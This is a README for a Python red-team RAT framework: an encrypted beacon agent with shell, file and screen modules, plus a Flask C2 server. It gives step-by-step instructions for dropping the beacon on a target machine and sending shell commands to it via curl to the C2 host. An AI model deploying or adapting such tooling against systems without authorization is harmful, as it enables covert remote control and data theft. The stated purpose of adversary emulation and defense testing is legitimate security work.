# simulated-adversary-control-agent-deployment

### Overview
Deploy a controlled, encrypted software agent designed to simulate real-world attacker behavior without risk or persistence. Leverage the **Red Team Beacon Framework**, a modular encrypted beacon + C2 simulation stack for red team operations and adversary emulation. Built for secure testing of endpoint defenses, dynamic payload staging, and encrypted tasking.

- Validate defensive controls
- Identify detection gaps
- Simulate encrypted malware tasking

### Features
-  AES-256 encrypted configuration
-  HTTPS beacon polling
-  Modular agent actions (shell, file, screen)
-  No hardcoded infrastructure — all dynamic
-  Custom tasks delivered via secure backend
-  Flask-based tasking server
-  UID-based target tracking
-  GUI-based key & config builder (rat_config_studio.py)


### Perfect For
- CISOs preparing tabletop exercises  
- Security teams validating EDR/NDR alerting  
- Managed security firms offering offensive services  
- Internal red/purple teams staging custom payloads
  
### Deployment Stack:
```
├── rat_config_studio.py
├── beacon.py
├── beacon_task_handler.py
├── config_decrypt.py
├── rat_config.json.enc
├── rat.key
├── c2_server.py
```
### How to use

**generate config & key on host machine**
```
python_rat_config_studio.py
generates rat.key, rat_config.json.enc
 Click “Generate AES-256 Key”
 Save the key securely
 Input your C2 URL, interval, and enabled modules
 Click “Encrypt Config”
 Deliver `.enc` file with corresponding `.key` to the beacon loader
 Use “Decrypt & View” to inspect any `.enc` file with the matching key
```
**run the c2 server**
```
python c2_server.py
```
**Server listens on:**
```
GET /checkin/<uid> – Polling beacon
POST /task/<uid> – Set task
POST /submit/<uid> – Receive result
```
**drop the following files onto target machine**
```
├── beacon.py
├── beacon_task_handler.py
├── config_decrypt.py
├── rat_config.json.enc
├── rat.key
```
**On Target Machine Run**
```
python beacon.py
```
**open cmd prompt and send a task**
```
curl -k -X POST https://<hosting_c2_server>:8080/task/<UID> ^
  -H "Content-Type: application/json" ^
  -d '{"module": "shell", "args": "whoami"}'
or use a one-liner with a task.json file you create
curl -k -X POST http://<hosting_c2_server>:8080/task/<UID> -H "Content-Type: application/json" -d @task.json
``` 
**NOTE:**  this toolset is interchangeable meaning the c2_url, interval and enabled modlues can modified.  What you see here is a simple payload simulation and you can change the module to be a payload you wish to test.  You must make the changes in the included files yourself!
## Disclaimer
**This tool is provided for ethical red team operations, threat simulations, and research. Do not use against systems you do not own or manage.**
